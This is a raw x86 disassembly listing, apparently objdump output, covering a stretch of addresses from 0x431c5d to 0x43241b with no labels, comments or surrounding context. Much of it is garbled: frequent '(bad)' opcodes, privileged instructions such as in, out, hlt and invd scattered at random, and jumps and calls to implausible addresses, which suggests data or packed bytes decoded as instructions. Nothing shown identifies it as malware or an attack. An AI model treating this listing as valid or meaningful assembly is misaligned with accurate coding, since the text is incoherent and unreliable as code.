  431c5d:	add    bh,al
  431c5f:	inc    ebp
  431c60:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431c67:	add    ebp,esp
  431c69:	shufps xmm1,xmm3,0xc7
  431c6d:	(bad)  
  431c6e:	jmp    0x74885797
  431c73:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431c79:	hlt    
  431c7a:	mov    ecx,DWORD PTR [edi]
  431c7c:	fadd   DWORD PTR [ebp+0x0]
  431c7f:	xor    ecx,DWORD PTR [edi]
  431c81:	add    ecx,ecx
  431c83:	cmp    edi,edi
  431c85:	pmuludq mm7,QWORD PTR [edx+0x50]
  431c89:	(bad)  
  431c8a:	jmp    0x431c17
  431c8c:	mov    edi,esp
  431c8e:	or     al,0xc6
  431c90:	inc    ebp
  431c91:	(bad)  
  431c92:	mov    eax,DWORD PTR [ebp+0x10]
  431c95:	jne    0x431c20
  431c97:	mov    eax,DWORD PTR [ecx]
  431c99:	clc    
  431c9a:	add    BYTE PTR [ebp-0x40],cl
  431c9d:	xor    edx,DWORD PTR [eax-0x73]
  431ca0:	jne    0x431ca3
  431ca2:	push   DWORD PTR [edx+0x8]
  431ca5:	add    BYTE PTR [ebp+0x45],al
  431ca8:	mov    ebp,ecx
  431caa:	cld    
  431cab:	add    BYTE PTR [ebp+0x0],cl
  431cae:	xor    eax,DWORD PTR [ebp+0x3]
  431cb1:	lea    edi,[ebx]
  431cb3:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431cb9:	sub    eax,0x5d330e4d
  431cbe:	lea    esi,[ebx]
  431cc0:	add    DWORD PTR [ebx],eax
  431cc2:	jb     0x431cad
  431cc4:	add    BYTE PTR [eax],al
  431cc6:	inc    ebp
  431cc7:	add    bl,ch
  431cc9:	inc    ebp
  431cca:	mov    esi,DWORD PTR [ebx]
  431ccc:	or     al,0x3
  431cce:	(bad)  
  431ccf:	mov    edi,eax
  431cd1:	in     al,dx
  431cd2:	scas   eax,DWORD PTR es:[edi]
  431cd3:	inc    ebp
  431cd4:	mov    esi,DWORD PTR [ebx]
  431cd6:	in     al,0x3
  431cd8:	add    al,0x89
  431cda:	mov    ecx,DWORD PTR [eax+edi*8]
  431cdd:	dec    ebp
  431cde:	(bad)  
  431cdf:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3166]
  431ce6:	mov    ecx,eax
  431ce8:	cld    
  431ce9:	push   es
  431cea:	dec    ebp
  431ceb:	add    al,0x33
  431ced:	mov    DWORD PTR [ebx],eax
  431cef:	in     al,dx
  431cf0:	cmp    DWORD PTR [ebp-0x67],eax
  431cf3:	mov    eax,DWORD PTR [ebp-0xba0068]
  431cf9:	mov    edx,DWORD PTR [ebp-0x4]
  431cfc:	mov    ecx,DWORD PTR [ebp-0x2c]
  431cff:	xor    eax,DWORD PTR [ebp+0x3]
  431d02:	cmp    DWORD PTR [ebx],0x8b327499
  431d08:	xor    edi,esp
  431d0a:	jmp    0xff771a5c
  431d0f:	add    ecx,DWORD PTR [ebp-0x3f]
  431d12:	xor    ebx,DWORD PTR [edi]
  431d14:	add    eax,ecx
  431d16:	cmp    ebx,DWORD PTR [eax]
  431d18:	mov    ecx,DWORD PTR [ebp-0x4]
  431d1b:	mov    ecx,DWORD PTR [eax]
  431d1d:	adc    BYTE PTR [ebp-0x80],al
  431d20:	jmp    0x431d23
  431d22:	mov    eax,DWORD PTR [eax]
  431d24:	cld    
  431d25:	mov    bh,0xc6
  431d27:	push   ecx
  431d28:	(bad)  
  431d29:	jne    0x431d89
  431d2b:	dec    ecx
  431d2d:	or     BYTE PTR [ecx+ebx*1],cl
  431d30:	push   ebp
  431d31:	inc    ebp
  431d32:	in     al,dx
  431d33:	add    ebp,esp
  431d35:	or     bh,al
  431d37:	dec    ebp
  431d38:	cld    
  431d39:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431d3f:	xor    DWORD PTR [edx+eax*1],0xffffff9c
  431d43:	dec    DWORD PTR [ebx+0x45510cf4]
  431d49:	mov    DWORD PTR [ebx+0x5345fc0c],ecx
  431d4f:	mov    edx,DWORD PTR [ecx+0xc]
  431d52:	xor    eax,esi
  431d54:	mov    edx,0xc172c7
  431d59:	inc    ebp
  431d5a:	mov    esi,DWORD PTR [ebp+0x8]
  431d5d:	mov    eax,edx
  431d5f:	call   0x84c7e454
  431d64:	add    DWORD PTR [edx-0x76bace00],ebx
  431d6a:	mov    ebp,eax
  431d6c:	or     BYTE PTR [eax],dl
  431d6e:	jo     0x431dbd
  431d70:	push   edi
  431d71:	xor    esi,DWORD PTR [ebp+0x3]
  431d74:	(bad)  
  431d75:	pmulhuw mm0,mm1
  431d78:	test   DWORD PTR [ebp-0x8],ecx
  431d7b:	mov    DWORD PTR [ebp-0x67],eax
  431d7e:	mov    eax,DWORD PTR [ebp-0x4]
  431d81:	xor    edi,DWORD PTR [ebp-0x73]
  431d84:	xor    eax,DWORD PTR [ebx]
  431d86:	xor    esi,DWORD PTR [edx+0x3]
  431d89:	add    BYTE PTR [ecx],bh
  431d8b:	inc    ebp
  431d8c:	(bad)  
  431d8d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431d93:	mov    DWORD PTR [eax],0x750f0004
  431d99:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431d9f:	lock add BYTE PTR [ebp+0x0],cl
  431da3:	mov    esi,DWORD PTR [ebp-0x18]
  431da6:	mov    ebp,edx
  431da8:	or     al,0x72
  431daa:	ja     0x431dac
  431dac:	mov    edx,esi
  431dae:	cld    
  431daf:	(bad)  
  431db2:	cli    
  431db3:	mov    esi,DWORD PTR [ebp-0x4]
  431db6:	cmp    ecx,esi
  431db8:	bswap  edi
  431dba:	(bad)
  431dbe:	mov    esi,DWORD PTR [ebp-0x4]
  431dc1:	mov    esi,ecx
  431dc3:	clc    
  431dc4:	repnz add esi,DWORD PTR [ebp+0x45]
  431dc8:	push   ebx
  431dc9:	xor    eax,DWORD PTR [ebp+0x3]
  431dcc:	cmp    bl,BYTE PTR [edi-0x64]
  431dcf:	pop    ebx
  431dd0:	jmp    0x431e97
  431dd5:	mov    esi,DWORD PTR [ebp-0x7d]
  431dd8:	xor    ebp,DWORD PTR [eax]
  431dda:	lea    eax,[ebp-0x8]
  431ddd:	xor    eax,0xc7ef9cf2
  431de2:	neg    eax
  431de4:	ins    DWORD PTR es:[edi],dx
  431de5:	test   esi,edi
  431de7:	clc    
  431de8:	pop    esp
  431de9:	inc    ebp
  431dea:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431df0:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431df6:	add    cl,al
  431df8:	jne    0x431d94
  431dfa:	mov    esi,DWORD PTR [edx]
  431dfc:	in     al,dx
  431dfd:	push   esi
  431dfe:	xor    BYTE PTR [ebp-0xe],dh
  431e01:	add    edi,esi
  431e03:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431e09:	add    cl,bh
  431e0b:	mov    edi,DWORD PTR [ebp+0x8]
  431e0e:	mov    DWORD PTR [ebp-0x14],esi
  431e11:	add    esi,DWORD PTR [ebp+0x3c]
  431e14:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431e1a:	mov    ah,0x38
  431e1c:	call   0xe0e4:0x898b329c
  431e23:	jne    0x431e9a
  431e25:	mov    ecx,DWORD PTR [ebx-0xe0e13f4]
  431e2b:	shl    edx,0xf2
  431e2e:	(bad)  
  431e2f:	mov    ah,0x16
  431e31:	dec    eax
  431e32:	jne    0x431dc7
  431e34:	mov    ecx,DWORD PTR [edi]
  431e36:	in     al,dx
  431e37:	jmp    0x431e2a
  431e39:	add    dl,dh
  431e3b:	mov    edi,esi
  431e3d:	or     al,0x8
  431e3f:	inc    ebp
  431e40:	jne    0x431e45
  431e42:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431e48:	ret    
  431e49:	or     bh,bh
  431e4b:	jge    0x431e35
  431e4d:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431e53:	xor    edi,eax
  431e55:	add    esi,DWORD PTR [ebp-0x77]
  431e58:	mov    ebx,esp
  431e5a:	clc    
  431e5b:	neg    DWORD PTR [ebp-0x7c]
  431e5e:	xor    eax,DWORD PTR [eax]
  431e60:	cmp    eax,DWORD PTR [eax]
  431e62:	repz jne 0x431dfa
  431e65:	xor    eax,DWORD PTR [ecx]
  431e67:	add    ebx,DWORD PTR [eax]
  431e69:	mov    DWORD PTR [ebp-0x8],eax
  431e6c:	mov    eax,edi
  431e6e:	cld    
  431e6f:	lock pop eax
  431e71:	test   DWORD PTR [ebx],esi
  431e73:	clc    
  431e74:	add    edx,DWORD PTR [edi-0x740bff77]
  431e7a:	fdivp  st(4),st
  431e7c:	test   ecx,esi
  431e7e:	(bad)  
  431e7f:	jnp    0x431e80
  431e81:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431e87:	jae    0x431e14
  431e89:	sub    edi,esp
  431e8b:	(bad)  
  431e8c:	shl    DWORD PTR [eax-0x3e],0x89
  431e90:	leave  
  431e91:	call   0x8198d59e
  431e96:	in     al,dx
  431e97:	(bad)  
  431e98:	in     al,dx
  431e99:	add    bh,al
  431e9b:	mov    esp,edi
  431e9d:	in     al,dx
  431e9e:	test   DWORD PTR [ebp-0x8],edi
  431ea1:	mov    eax,DWORD PTR [ebp+0x2b]
  431ea4:	xor    al,0x3
  431ea6:	pushf  
  431ea7:	jnp    0x57321ae0
  431ead:	xor    edx,DWORD PTR [ebx-0x77]
  431eb0:	push   ecx
  431eb1:	loopne 0x431ee6
  431eb3:	jne    0x431e70
  431eb5:	mov    esi,DWORD PTR [edx-0x20]
  431eb8:	add    BYTE PTR [ebp-0x3d],bh
  431ebb:	xor    eax,DWORD PTR [ebp-0x73]
  431ebe:	mov    edi,DWORD PTR [esi]
  431ec0:	cld    
  431ec1:	jb     0x431e89
  431ec3:	add    bl,al
  431ec5:	jne    0x431f0c
  431ec7:	mov    edx,DWORD PTR [edi-0x10]
  431eca:	jge    0x431f49
  431ecc:	mov    esi,DWORD PTR [ebx]
  431ece:	lock add ecx,DWORD PTR [ebp+0x3b]
  431ed2:	xor    esi,DWORD PTR [ebp-0x77]
  431ed5:	mov    esi,eax
  431ed7:	lock inc ebp
  431ed9:	jge    0x431f10
  431edb:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431ee2:	dec    ebp
  431ee3:	mov    esi,DWORD PTR [ebx]
  431ee5:	loopne 0x431e70
  431ee7:	jge    0x431ee1
  431ee9:	add    DWORD PTR [ebp-0x7d],eax
  431eec:	cmc    
  431eed:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431ef4:	dec    ebp
  431ef5:	hlt    
  431ef6:	xor    ebx,DWORD PTR [ebp-0x77]
  431ef9:	mov    esi,esp
  431efb:	in     al,0x45
  431efd:	jge    0x431f38
  431eff:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431f06:	dec    ebp
  431f07:	dec    esp
  431f08:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431f0e:	inc    ebp
  431f0f:	hlt    
  431f10:	xor    eax,0xb88b9f75
  431f15:	add    al,0x95
  431f17:	icebp  
  431f18:	add    dl,dh
  431f1a:	mov    DWORD PTR [ebp+0x20],ebx
  431f1d:	cmp    eax,DWORD PTR [ebp+0xf]
  431f20:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431f24:	fistp  WORD PTR [ebx+0x0]
  431f27:	inc    ebp
  431f28:	mov    ebx,DWORD PTR [edi+0xc]
  431f2b:	add    eax,eax
  431f2d:	inc    ebp
  431f2e:	test   BYTE PTR [ebx],dh
  431f30:	add    eax,DWORD PTR [ebx]
  431f32:	add    BYTE PTR [esi+0x45],bl
  431f35:	ret    0x85
  431f38:	jnp    0x5443a307
  431f3e:	inc    bp
  431f40:	inc    ebp
  431f41:	xor    eax,0xc78a9cb9
  431f46:	add    ah,bl
  431f48:	xor    eax,DWORD PTR [ebp+0x453bf8b9]
  431f4e:	add    BYTE PTR [ebx+0x3],dl
  431f51:	mov    esi,0x708088b
  431f56:	cmp    esi,eax
  431f58:	setp   BYTE PTR [ecx-0x74fcffce]
  431f5f:	mov    esp,edi
  431f61:	call   0x33ce64b3
  431f66:	or     BYTE PTR [ebx],al
  431f68:	inc    ecx
  431f69:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  431f6f:	and    BYTE PTR [ebp-0x7074f0bb],al
  431f75:	lock add cl,al
  431f78:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  431f7f:	mov    ch,0x45
  431f81:	clc    
  431f82:	xor    eax,DWORD PTR [ebp+0x3]
  431f85:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  431f8b:	inc    ebp
  431f8c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  431f92:	mov    edi,eax
  431f94:	mov    eax,DWORD PTR [ebp+0x3c]
  431f97:	mov    ecx,DWORD PTR [eax]
  431f99:	hlt    
  431f9a:	inc    ebp
  431f9b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  431fa2:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  431fa8:	push   ebp
  431fa9:	mov    edi,DWORD PTR [ebx]
  431fab:	in     al,dx
  431fac:	jne    0x431f6f
  431fae:	mov    eax,DWORD PTR [ebp-0x28]
  431fb1:	add    DWORD PTR [eax],0xe8058dec
  431fb7:	clc    
  431fb8:	mov    esi,DWORD PTR [edi-0x8]
  431fbb:	add    dh,dl
  431fbd:	rol    WORD PTR [ebp-0x1],cl
  431fc1:	mov    edx,DWORD PTR [eax+0x8]
  431fc4:	jne    0x431f86
  431fc6:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  431fcd:	inc    ebp
  431fce:	push   esp
  431fcf:	test   DWORD PTR [ecx+0xf],ecx
  431fd2:	sub    edx,esp
  431fd4:	add    eax,DWORD PTR [eax]
  431fd6:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  431fdc:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  431fe3:	mov    eax,DWORD PTR [ecx]
  431fe5:	and    BYTE PTR [eax],al
  431fe7:	cmp    dl,BYTE PTR [eax]
  431fe9:	add    BYTE PTR [ebp+0x66],al
  431fec:	inc    ecx
  431fee:	push   esp
  431fef:	add    BYTE PTR [ebp+0x0],dh
  431ff2:	push   edx
  431ff3:	enterw 0xc1,0x4d
  431ff8:	mov    esp,DWORD PTR [esi+0x20]
  431ffb:	add    DWORD PTR [ecx-0x7b],eax
  431ffe:	add    eax,DWORD PTR [ebx]
  432000:	str    WORD PTR [eax+0x45]
  432004:	lea    ecx,[ebx+0x45890801]
  43200a:	sbb    BYTE PTR [ebx],al
  43200c:	dec    ebp
  43200d:	cmp    al,0xf
  43200f:	inc    ebp
  432010:	push   eax
  432011:	mov    esi,DWORD PTR [ebx]
  432013:	push   eax
  432014:	add    eax,eax
  432016:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  43201d:	inc    ebp
  43201e:	add    BYTE PTR ds:0x8b4d8c00,dh
  432024:	xor    edx,esp
  432026:	add    eax,esi
  432028:	mov    ebx,eax
  43202a:	loopne 0x432071
  43202c:	dec    ebp
  43202d:	mov    ecx,DWORD PTR [edi]
  43202f:	cld    
  432030:	push   eax
  432031:	xchg   DWORD PTR [ebx],esi
  432033:	add    DWORD PTR [ebx],ebp
  432035:	add    BYTE PTR [ebx],ch
  432037:	or     BYTE PTR [ecx],bh
  432039:	dec    ecx
  43203a:	loopne 0x43203f
  43203c:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  432042:	push   ebp
  432043:	add    DWORD PTR [ebx+0x55100800],eax
  432049:	dec    ebp
  43204a:	jmp    0x431fd5
  43204c:	mov    esp,DWORD PTR [eax]
  43204e:	sbb    dl,dl
  432050:	inc    eax
  432051:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432057:	add    BYTE PTR [ebx+0x74528555],cl
  43205d:	push   ebp
  43205e:	div    DWORD PTR [ebx]
  432060:	and    eax,DWORD PTR [ebx]
  432062:	add    edx,DWORD PTR [edx-0x30]
  432065:	jno    0x431ff2
  432067:	inc    DWORD PTR [eax+eiz*1]
  43206a:	inc    ebp
  43206b:	push   eax
  43206c:	push   eax
  43206d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  432073:	mov    edi,esp
  432075:	push   eax
  432076:	inc    ebp
  432077:	enter  0x458b,0x8
  43207b:	push   ecx
  43207c:	(bad)  
  43207d:	call   0x10d2a55
  432082:	pop    ss
  432083:	push   ebp
  432084:	mov    ecx,DWORD PTR [ebx+0x489408]
  43208a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  432090:	push   ecx
  432091:	jo     0x43207b
  432093:	inc    DWORD PTR [edi]
  432095:	or     BYTE PTR [eax],al
  432097:	call   0xce27e1
  43209c:	fmul   QWORD PTR [ebp+0x55]
  43209f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4320a5:	mov    bh,0x8c
  4320a7:	adc    al,0x9a
  4320a9:	dec    esp
  4320aa:	xor    bl,BYTE PTR [eax]
  4320ac:	mov    ecx,DWORD PTR [ebp+0xc]
  4320af:	mov    eax,DWORD PTR [ebp-0x4]
  4320b2:	mov    esi,DWORD PTR [edi-0x3148f924]
  4320b8:	push   es
  4320b9:	retf   
  4320ba:	mov    BYTE PTR [ebp-0x30],0x3b
  4320be:	inc    ebp
  4320bf:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4320c6:	retf   0x83fc
  4320c9:	into   
  4320ca:	dec    ebp
  4320cb:	retf   
  4320cc:	mov    ecx,DWORD PTR [ebp-0x74]
  4320cf:	mov    eax,DWORD PTR [eax]
  4320d1:	fdiv   QWORD PTR [ebx]
  4320d3:	mov    bh,0x3
  4320d5:	push   es
  4320d6:	mov    esi,ecx
  4320d8:	sbb    cl,dl
  4320da:	dec    ebp
  4320db:	sar    DWORD PTR [ebx],cl
  4320dd:	push   ebp
  4320de:	jne    0x4320ef
  4320e0:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4320e6:	lea    ebx,[eax]
  4320e8:	call   0xf4ccacaf
  4320ed:	sbb    dh,dl
  4320ef:	add    edx,ebx
  4320f1:	push   ebp
  4320f2:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4320f8:	push   ecx
  4320f9:	mov    DWORD PTR [eax-0x30],edx
  4320fc:	test   DWORD PTR [edx],eax
  4320fe:	xadd   esp,esi
  432101:	pop    es
  432102:	add    cl,dl
  432104:	mov    eax,ecx
  432106:	or     al,0x45
  432108:	(bad)  
  432109:	push   eax
  43210a:	add    DWORD PTR [edx+0x0],eax
  43210d:	add    ecx,DWORD PTR [ecx]
  43210f:	and    dh,cl
  432111:	call   0xc729e1
  432116:	add    DWORD PTR [ebp+0x0],edx
  432119:	mov    esp,DWORD PTR [ebp+0x18]
  43211c:	add    BYTE PTR [eax+0x54],cl
  43211f:	xor    eax,DWORD PTR [eax]
  432121:	add    esp,DWORD PTR [esi+0x3b]
  432124:	inc    ebp
  432125:	je     0x4320aa
  432127:	push   ecx
  432128:	cli    
  432129:	dec    ebp
  43212a:	mov    DWORD PTR [ebx],eax
  43212c:	(bad)  
  43212d:	or     al,0x5e
  43212f:	inc    eax
  432130:	add    BYTE PTR [ebx],al
  432132:	data16 and BYTE PTR [ebp+0x50],al
  432136:	sub    DWORD PTR [ecx],0xfffffff8
  432139:	add    BYTE PTR [ebp-0x75],ah
  43213c:	add    BYTE PTR [eax],bl
  43213e:	enter  0x894d,0x8b
  432142:	int3   
  432143:	loopne 0x43217f
  432145:	rol    BYTE PTR [eax],0x33
  432148:	lea    cx,[ebp+0xa]
  43214c:	data16 jb 0x432194
  43214f:	add    BYTE PTR [ebx+0x44890855],cl
  432155:	sbb    ah,al
  432157:	inc    ebp
  432158:	cmp    cl,BYTE PTR [edi]
  43215a:	add    BYTE PTR [edx+0x66],dl
  43215d:	xor    ecx,DWORD PTR [eax]
  43215f:	sub    eax,DWORD PTR [eax]
  432161:	mov    eax,DWORD PTR [eax]
  432163:	or     al,0x66
  432165:	ror    edx,cl
  432167:	dec    ebp
  432168:	inc    ebp
  432169:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43216f:	cld    
  432170:	or     BYTE PTR [edi+0x4501dd],dl
  432176:	ror    dh,0xee
  432179:	retf   
  43217a:	(bad)  
  43217b:	dec    ebp
  43217c:	mov    al,0x8b
  43217e:	loop   0x4321a0
  432180:	cmp    ecx,DWORD PTR [edx]
  432182:	inc    ebp
  432183:	daa    
  432184:	loop   0x43210d
  432186:	out    dx,al
  432187:	add    edi,eax
  432189:	add    BYTE PTR [eax+0x3f52ed55],bh
  43218f:	push   ebp
  432190:	inc    ebp
  432191:	xor    ebx,eax
  432193:	add    ebp,esi
  432195:	push   edx
  432196:	push   bp
  432198:	inc    ebp
  432199:	(bad)  
  43219a:	jmp    0xc342e7f3
  43219f:	sbb    al,0x33
  4321a1:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4321a8:	add    BYTE PTR [ebp+0x45],0x8b
  4321ac:	jmp    0xf98b:0x100041c8
  4321b3:	xor    esi,DWORD PTR [edx+0x3]
  4321b6:	mov    ecx,DWORD PTR [edi]
  4321b8:	fmul   DWORD PTR [edx]
  4321ba:	add    BYTE PTR [eax],al
  4321bc:	lea    eax,[ebx-0x4700273c]
  4321c2:	add    al,0x4f
  4321c4:	pop    DWORD PTR [eax]
  4321c6:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4321cc:	push   edx
  4321cd:	inc    WORD PTR [ebp+0x8]
  4321d1:	mov    eax,0x514f4d
  4321d6:	(bad)
  4321da:	add    al,al
  4321dc:	xor    DWORD PTR [ebx-0x74baf730],eax
  4321e2:	test   DWORD PTR [esi+0x74],esp
  4321e5:	inc    ebp
  4321e6:	mov    DWORD PTR [eax+0xa4f08],edi
  4321ec:	add    BYTE PTR [ecx-0x76c435bb],cl
  4321f2:	or     dh,cl
  4321f4:	or     eax,0x8b8d5045
  4321f9:	inc    ebp
  4321fa:	mov    WORD PTR [ecx+0x3b8a00],?
  432200:	jne    0x432235
  432202:	mov    edi,DWORD PTR [edx+0x8f3b18]
  432208:	add    DWORD PTR [ebx],eax
  43220a:	add    bh,bh
  43220c:	adc    DWORD PTR [eax],ecx
  43220e:	adc    DWORD PTR [ebp+0x55],edi
  432211:	push   es
  432212:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  432218:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11d8]
  43221f:	inc    ebp
  432220:	mov    esp,edi
  432222:	or     al,0xd8
  432224:	push   eax
  432225:	(bad)  
  432226:	jne    0x4321dc
  432228:	call   0x3b1b15
  43222d:	inc    ebp
  43222e:	sar    BYTE PTR [edx],0x84
  432231:	out    dx,al
  432232:	add    bh,al
  432234:	add    BYTE PTR [ebp+esi*2-0x247428],bh
  43223b:	(bad)  
  43223c:	and    al,al
  43223e:	fs jmp 0x7cc86843
  432244:	bswap  ecx
  432246:	scas   al,BYTE PTR es:[edi]
  432247:	inc    esp
  432248:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43224f:	or     BYTE PTR [ebx-0x97717c7],0x83
  432256:	call   DWORD PTR [edi]
  432258:	shr    ah,0x84
  43225b:	xchg   DWORD PTR [eax],eax
  43225d:	add    DWORD PTR [eax],eax
  43225f:	add    bh,bh
  432261:	dec    ebp
  432262:	and    BYTE PTR [ecx-0x38],dl
  432265:	push   eax
  432266:	dec    DWORD PTR [ebx+0xfd885]
  43226c:	mov    BYTE PTR [ebp+0x508bac00],cl
  432272:	mov    WORD PTR [ecx+0x0],ss
  432275:	lea    ecx,[ebx+0x108b20d8]
  43227b:	mov    WORD PTR [edx],ds
  43227d:	add    BYTE PTR [edi+0xff01ff],al
  432283:	mov    ecx,DWORD PTR [ebp-0x28]
  432286:	push   ecx
  432287:	shl    BYTE PTR [ebp+0x3a],0x8b
  43228b:	inc    ebp
  43228c:	in     al,0xeb
  43228e:	jno    0x43221b
  432290:	push   edx
  432291:	mov    DWORD PTR [eax-0x28],edx
  432294:	mov    eax,DWORD PTR [ebp+0x20]
  432297:	je     0x432220
  432299:	mov    eax,DWORD PTR [ecx]
  43229b:	sbb    BYTE PTR [eax],al
  43229d:	pop    DWORD PTR [eax]
  43229f:	add    esi,eax
  4322a1:	add    bl,al
  4322a3:	adc    DWORD PTR [edi],esi
  4322a5:	jmp    0x8bce72f7
  4322aa:	sub    BYTE PTR [ebp+eax*2-0x63c4cb00],cl
  4322b1:	jne    0x43223e
  4322b3:	mov    ecx,DWORD PTR [eax]
  4322b5:	in     al,0x75
  4322b7:	pop    DWORD PTR [ecx+0x5301]
  4322bd:	push   edx
  4322be:	inc    DWORD PTR [ebx]
  4322c0:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4322c6:	add    BYTE PTR [edi+0x9],dl
  4322c9:	call   DWORD PTR [esi]
  4322cb:	and    dl,al
  4322cd:	and    bh,bh
  4322cf:	inc    edi
  4322d1:	test   eax,edx
  4322d3:	sldt   ebx
  4322d6:	xor    al,0x0
  4322d8:	pushf  
  4322d9:	(bad)  
  4322da:	jmp    0x4322e8
  4322dc:	mov    eax,edi
  4322de:	or     al,0x75
  4322e0:	inc    eax
  4322e1:	call   0x4319e9
  4322e6:	mov    eax,eax
  4322e8:	loopne 0x43226e
  4322ea:	inc    ebp
  4322eb:	add    BYTE PTR [ebx+0x1451c00],cl
  4322f1:	mov    eax,DWORD PTR [ebp+0x20]
  4322f4:	add    edi,ecx
  4322f6:	add    BYTE PTR [eax],ch
  4322f8:	cmp    edi,0x18
  4322fb:	test   DWORD PTR [ebp+0xf],esi
  4322fe:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  432305:	jne    0x432309
  432307:	call   0xffa21dcc
  43230c:	leave  
  43230d:	rcr    BYTE PTR [esp+eax*4],0x55
  432311:	add    ah,ch
  432313:	add    BYTE PTR [edi-0x48fef979],dh
  432319:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  432320:	inc    esp
  432321:	mov    ebx,DWORD PTR [eax]
  432323:	fcom   st(2)
  432325:	add    BYTE PTR [edi],bl
  432327:	lea    ecx,[eax-0x18]
  43232a:	(bad)  
  43232b:	push   DWORD PTR [ecx]
  43232d:	call   0xffb5708f
  432332:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432336:	fstp   DWORD PTR [esi+ebx*8]
  432339:	push   ebp
  43233a:	pop    ebp
  43233b:	mov    esi,DWORD PTR [edx-0x38]
  43233e:	add    DWORD PTR [eax],0x28
  432341:	mov    edi,DWORD PTR [ebx]
  432343:	xor    esi,DWORD PTR [edx+0x3]
  432346:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  43234a:	pop    ebp
  43234b:	or     al,0x4
  43234d:	inc    ecx
  43234e:	push   ebp
  43234f:	(bad)  
  432350:	in     al,dx
  432351:	or     ah,ch
  432353:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432354:	xbegin 0xffc8994a
  43235a:	clc    
  43235b:	adc    al,0x45
  43235d:	div    BYTE PTR [eax+ecx*1]
  432360:	pushf  
  432361:	add    bh,al
  432363:	jne    0x43233d
  432365:	add    DWORD PTR [ebp+0x5b00f89a],0x66710066
  43236f:	add    eax,DWORD PTR [ebp+0x52]
  432372:	adc    eax,0x20
  432375:	xchg   DWORD PTR [ecx+0x4000fc01],ecx
  43237b:	test   DWORD PTR [eax],eax
  43237d:	clc    
  43237e:	data16 or al,BYTE PTR [ebp+0x45]
  432382:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432389:	rol    BYTE PTR [ebp+0x45],1
  43238c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  432392:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432398:	push   ebx
  432399:	add    BYTE PTR [ebx+0x0],dl
  43239c:	push   ecx
  43239d:	jge    0x4323d2
  43239f:	add    BYTE PTR [esi+0x4],dl
  4323a2:	jne    0x432409
  4323a4:	mov    edx,0x457200
  4323a9:	jmp    0x43236d
  4323ab:	xor    edi,DWORD PTR [ebx]
  4323ad:	pop    edi
  4323ae:	cvtdq2ps xmm7,xmm0
  4323b1:	ret    0x0
  4323b4:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4323ba:	xor    ecx,DWORD PTR [edi]
  4323bc:	add    eax,DWORD PTR [ecx+0x3b]
  4323bf:	push   ebx
  4323c0:	rdpmc  
  4323c2:	out    0x8d,al
  4323c4:	add    BYTE PTR [eax],cl
  4323c6:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4323cc:	ret    0x450c
  4323cf:	sbb    al,0x8b
  4323d1:	cmp    eax,esi
  4323d3:	or     cl,al
  4323d5:	or     al,0xc2
  4323d7:	pop    eax
  4323d8:	inc    ebp
  4323d9:	add    ecx,DWORD PTR [edi]
  4323db:	add    esi,DWORD PTR [ebp+0x39]
  4323de:	invd   
  4323e0:	jge    0x4323ec
  4323e2:	mov    eax,0x478ac0
  4323e7:	cli    
  4323e8:	xor    esp,ecx
  4323ea:	mov    ebx,0x5b8ac0
  4323ef:	ret    0x33
  4323f2:	mov    eax,0x833b8b
  4323f7:	sub    BYTE PTR [ebx],al
  4323f9:	inc    ebp
  4323fa:	xor    ax,0x9cf8
  4323fe:	inc    bh
  432400:	mov    esp,esp
  432402:	hlt    
  432403:	test   DWORD PTR [ebp-0x8],esi
  432406:	mov    eax,DWORD PTR [ebp-0x14]
  432409:	cmp    ecx,DWORD PTR [ebx-0x76478864]
  43240f:	dec    edi
  432410:	or     BYTE PTR [eax],al
  432412:	jne    0x43239d
  432414:	mov    esi,esp
  432416:	call   0x77a9afdb
  43241b:	inc    ebp
